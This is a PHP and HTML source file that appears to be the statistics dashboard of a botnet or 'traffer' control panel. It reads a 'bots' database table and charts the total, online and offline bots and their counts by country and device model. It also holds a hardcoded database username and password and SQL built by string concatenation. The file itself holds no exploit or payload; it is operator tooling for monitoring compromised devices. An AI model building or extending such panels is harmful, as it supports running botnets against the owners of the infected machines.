<!DOCTYPE html>
<html>
<head>
    <title>Traff</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        .chart-container {
            display: flex;
        }

        .chart {
            width: 50%
        }

        .container {
            display: flex; 
            justify-content: space-between;
        }

        .box {
            width: 30%;
            padding: 20px;
            border: 1px solid #ccc;
            background-color: #262626;
            text-align: center; 
        }

        body {
        background-color: #121212;
        }

        h2 {
            color:white;
        }
    </style>
</head>
<body>
    <?php
    $mysqli = new mysqli('localhost', 'phoniex', '..sqlpasswordtraffic..', 'bot');
    if ($mysqli->connect_error) {
        die('Connection failed: ' . $mysqli->connect_error);
    }
    $tag = "TAG";

    // total

    $queryTotal = "SELECT COUNT(*) AS total_bots FROM bots WHERE TAG = ?";
    $stmt = $mysqli->prepare($queryTotal);
    $stmt->bind_param('s', $tag);
    $stmt->execute();
    $stmt->bind_result($total_bots);
    $stmt->fetch();
    $stmt->close();

    // online

    $queryOnline = "SELECT COUNT(*) AS online_bots FROM bots WHERE (TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=600) AND TAG = ?";
    $stmt = $mysqli->prepare($queryOnline);
    $stmt->bind_param('s', $tag);
    $stmt->execute();
    $stmt->bind_result($online_bots);
    $stmt->fetch();
    $stmt->close();

    // offline bots

    $queryOffline = "SELECT COUNT(*) AS online_bots FROM bots WHERE (TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=600) AND TAG = ?";
    $stmt = $mysqli->prepare($queryOffline);
    $stmt->bind_param('s', $tag);
    $stmt->execute();
    $stmt->bind_result($offline_bots);
    $stmt->fetch();
    $stmt->close();

    // dead

    // country
    $queryOrdersPerCountry = "SELECT country, COUNT(*) AS order_count FROM bots WHERE TAG = '".$tag."' GROUP BY country";
    $resultOrdersPerCountry = $mysqli->query($queryOrdersPerCountry);

    // model

    $queryOrdersPerModel = "SELECT model, COUNT(*) AS model_count FROM bots WHERE TAG = '".$tag."' GROUP BY model";
    $resultOrdersPerModel = $mysqli->query($queryOrdersPerModel);

    $chartData = [];
    while ($row = $resultOrdersPerCountry->fetch_assoc()) {
        $chartData[$row['country']] = $row['order_count'];
    }

    $ModelChartData = [];
    while ($row = $resultOrdersPerModel->fetch_assoc()) {
        $ModelChartData[$row['model']] = $row['model_count'];
    }
    $mysqli->close();
    ?>


<h1 style="color:#ffffff">Traffer for <?php echo $tag; ?></h1>

<div class="container">
        <div class="box">
            <?php
                echo "<h2>Total Bots: $total_bots</h2>";
            ?>
        </div>
        <div class="box">
            <?php
                echo "<h2 >Online Bots: $online_bots</h2>";
            ?>
        </div>
        <div class="box">
            <?php
                echo "<h2>Offline Bots: $offline_bots</h2>";
            ?>
        </div>
</div>


<div class="chart-container">
        <div class="chart">
            <center><h2>Bots per Country:</h2></center>
            <canvas id="countryChart" width="700" height="400"></canvas>
        </div>
        
        <div class="chart">
        <center><h2>Bots per Model:</h2></center>
            <canvas id="modelChart" width="700" height="400"></canvas>
        </div>
</div>
<script>
    var ctx = document.getElementById('modelChart').getContext('2d');
    var chartData = <?php echo json_encode($ModelChartData); ?>;
    var countries = Object.keys(chartData);
    var orderCounts = Object.values(chartData);
    var chartWidth = 1000;
    var chartHeight = 400;

    var ordersChart = new Chart(ctx, {
        type: 'bar',
        data: {
            labels: countries,
            datasets: [{
                axis: "y",
                label: 'Bots',
                data: orderCounts,
                backgroundColor: 'rgba(75, 192, 192, 0.2)',
                borderColor: 'rgba(75, 192, 192, 1)',
                borderWidth: 1
            }]
        },
        options: {
            indexAxis: 'y',
            responsive: false,
            maintainAspectRatio: false,
            width: chartWidth,
            height: chartHeight,
            scales: {
                x: {
                    beginAtZero: true
                }
            }
        }
    });
</script>
<script>
    var ctx = document.getElementById('countryChart').getContext('2d');
    var chartData = <?php echo json_encode($chartData); ?>;
    var countries = Object.keys(chartData);
    var orderCounts = Object.values(chartData);
    var chartWidth = 1000;
    var chartHeight = 500;

    var ordersChart = new Chart(ctx, {
        type: 'bar',
        data: {
            labels: countries,
            datasets: [{
                label: 'Bots',
                data: orderCounts,
                backgroundColor: 'rgba(75, 192, 192, 0.2)',
                borderColor: 'rgba(75, 192, 192, 1)',
                borderWidth: 1
            }]
        },
        options: {
            responsive: false,
            maintainAspectRatio: false,
            width: chartWidth,
            height: chartHeight,
            scales: {
                y: {
                    beginAtZero: true
                }
            }
        }
    });
</script>
</body>
</html>
